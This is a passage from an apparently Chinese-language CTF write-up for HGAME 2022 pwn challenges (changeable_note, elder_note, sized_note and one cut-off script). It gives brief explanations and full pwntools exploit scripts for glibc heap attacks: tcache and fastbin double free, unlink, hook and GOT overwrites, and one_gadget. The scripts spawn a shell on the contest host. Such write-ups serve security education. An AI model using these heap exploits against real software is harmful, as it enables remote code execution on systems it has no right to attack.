class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./note&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">51475</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsorted bin leak</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):          <span class="comment">#填满tcache 7  size相同</span></span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>,<span class="string">&#x27;protected&#x27;</span>)     <span class="comment">#防止合并进top chunk</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">lbase = malloc_hook - libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line">free_hook = lbase+libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system_addr = lbase+libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#tcache stashing </span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):          <span class="comment">#填满tcache   7  size相同</span></span><br><span class="line">    add(i, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#fast bin</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):          <span class="comment">#清空 tcache</span></span><br><span class="line">    add(i, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x20</span> , p64(free_hook))</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="week3">week3</h2><h3 id="changeable-note">changeable_note</h3><h4 id="思路-3">思路</h4><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220215231334333.png" class=""><p>​    存在堆溢出，可以伪造 <code>chunk</code> 实现 <code>unlink</code>，让 <code>notes[1] = &amp;notes[1]-0x18</code>，劫持 <code>free</code> 为 <code>puts</code> 从而获得 libc 基址，最后再劫持 <code>atoi</code> 为 <code>system</code> 拿到 <code>shell</code></p><table><thead><tr><th style="text-align:center">chunk1     -&gt;</th><th style="text-align:center">0</th></tr></thead><tbody><tr><td style="text-align:center"></td><td style="text-align:center">0x31</td></tr><tr><td style="text-align:center">fake chunk    -&gt;</td><td style="text-align:center">0</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">0x21</td></tr><tr><td style="text-align:center">fake fd   -&gt;</td><td style="text-align:center">&amp;notes[1]-0x18</td></tr><tr><td style="text-align:center">fake bk   -&gt;</td><td style="text-align:center">&amp;notes[1]-0x10</td></tr><tr><td style="text-align:center">size检查</td><td style="text-align:center">0x20</td></tr><tr><td style="text-align:center"></td><td style="text-align:center">…</td></tr><tr><td style="text-align:center">chunk2   -&gt;</td><td style="text-align:center">0x30</td></tr><tr><td style="text-align:center">prev_inuse 为 0，前一个chunk为 free 状态</td><td style="text-align:center">0x90</td></tr></tbody></table><h4 id="exp-3">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./note&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">52548</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line"><span class="comment"># unlink</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ptr0 = <span class="number">0x4040C0</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr0+<span class="number">8</span>-<span class="number">0x18</span>)+p64(ptr0+<span class="number">8</span>-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(f.got[<span class="string">&quot;free&quot;</span>])+p64(f.got[<span class="string">&quot;puts&quot;</span>])+p64(<span class="number">0</span>)+p64(f.got[<span class="string">&quot;atoi&quot;</span>])</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">edit(<span class="number">0</span>,p64(f.plt[<span class="string">&quot;puts&quot;</span>])[<span class="number">0</span>:<span class="number">7</span>])     <span class="comment">#8个字节会覆盖下个函数</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">lbase = leak_addr-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(lbase+libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="elder-note">elder_note</h3><h4 id="思路-4">思路</h4><p>​    <a href="https://xz.aliyun.com/t/7490">https://xz.aliyun.com/t/7490</a></p><p>​通过 <code>show</code> 功能实现 <code>unsorted bin leak</code> ，<code>delete</code> 中指针未置为0，存在 UAF，可以采用 <code>fastbin attack</code></p><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220215233823469.png" class=""><p>​<code>fastbin</code> 存在 <code>size</code> 检查，可以利用字节错位绕过 <code>size</code> 域的检测，一般是在 <code>__malloc_hook</code> 附近伪造 chunk （<code>Arbitrary Alloc</code>）</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;__malloc_hook </span><br><span class="line">$<span class="number">1</span> = (void *<span class="comment">(**)</span>(size_t, <span class="keyword">const</span> void *)) <span class="number">0</span>x7f40310f6b10 &lt;__malloc_hook&gt; </span><br><span class="line"></span><br><span class="line">pwndbg&gt; find_fake_fast <span class="number">0</span>x7f40310f6b10 <span class="number">0</span>x7f</span><br><span class="line">FAKE CHUNKS</span><br><span class="line">Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: <span class="number">0</span>x7f40310f6aed</span><br><span class="line">prev_size: <span class="number">0</span>x40310f5260000000</span><br><span class="line">size: <span class="number">0</span>x7f</span><br><span class="line">fd: <span class="number">0</span>x4030db7ea0000000</span><br><span class="line">bk: <span class="number">0</span>x4030db7a7000007f</span><br><span class="line">fd_nextsize: <span class="number">0</span>x7f</span><br><span class="line">bk_nextsize: <span class="number">0</span>x00</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p /x <span class="number">0</span>x7f40310f6b10-<span class="number">0</span>x7f40310f6aed</span><br><span class="line">$<span class="number">2</span> = <span class="number">0</span>x23</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    本来之后劫持 <code>__malloc_hook</code> 为 <code>one_gadget</code> 就可以 <code>get shell</code>，但是这里的 <code>one_gadget</code> 都不满足条件，所以要通过 <code>__realloc_hook</code> 来调整栈帧，劫持 <code>__realloc_hook</code> 为 <code>one_gadget</code></p><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220216010136512.png" class=""><p>​    <code>realloc</code> 函数开头的 <code>push</code> 和 <code>sub rsp,18h</code> 可以调整栈来满足 <code>one_gadget</code> 的使用条件</p><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220216010456725.png" class=""><p>​    <code>__realloc_hook</code> 和 <code>__malloc_hook</code> 邻近，可以一次性劫持</p><h4 id="exp-4">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./note2&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">52617</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>).decode().strip()</span><br><span class="line">    log.success(<span class="string">&#x27;hash_code=&#123;&#125;,&#x27;</span>.<span class="built_in">format</span>(hash_code))</span><br><span class="line"></span><br><span class="line">    charset = string.printable</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, <span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendafter(<span class="string">&#x27;????&gt; &#x27;</span>, proof)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">proof_of_work()</span><br><span class="line"><span class="comment">#unsorted bin leak</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x10</span></span><br><span class="line">lbase = malloc_hook-libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(lbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr = lbase+libc.symbols[&quot;system&quot;]</span></span><br><span class="line">one_gadget = lbase+<span class="number">0x4527a</span></span><br><span class="line">realloc_hook = lbase + libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;reallock_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">log.info(<span class="string">&quot;ongadget:&quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line"><span class="comment">#fastbin attack</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">fake_chunk_addr = malloc_hook-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,p64(fake_chunk_addr))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*(<span class="number">0x13</span>-<span class="number">8</span>)+p64(one_gadget)+p64(realloc_hook+<span class="number">0x10</span>)       <span class="comment">#realloc调栈帧</span></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;6&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="sized-note">sized_note</h3><h4 id="思路-5">思路</h4><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220215224539479.png" class=""><img src="/2022/02/18/HGAME2022-Pwn-wp/image-20220215224711357.png" class=""><p>​    add 和 edit 都存在 <code>off-by-null</code>，通过利用可以造成 <code>chunk overlapping</code> ，进而 <code>leak libc</code> 和改写 <code>tcache</code> 的 <code>next</code> 指针</p><p>​    <a href="https://blog.csdn.net/qq_43409582/article/details/109825038">https://blog.csdn.net/qq_43409582/article/details/109825038</a></p><h4 id="chunk-overlapping">chunk overlapping</h4><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/#4extendoverlapping">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/#4extendoverlapping</a></p><blockquote><p>通过 extend 前向 overlapping：改写 <code>chunk</code> 的 <code>prev_size</code> 域和 <code>prev_inuse</code> 域合并堆块，利用了unlink 机制，<strong>可以跨越多个堆块进行合并</strong></p></blockquote><blockquote><p>通过 extend 后向 overlapping：改写 <code>size</code> 域实现 <code>overlapping</code></p></blockquote><h4 id="exp-5">exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#r = process(&#x27;./note3&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&quot;chuj.top&quot;</span>,<span class="number">52863</span>)</span><br><span class="line">f = ELF(<span class="string">&#x27;./note3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>():</span></span><br><span class="line">    r.recvuntil(<span class="string">&#x27;) == &#x27;</span>)</span><br><span class="line">    hash_code = r.recvuntil(<span 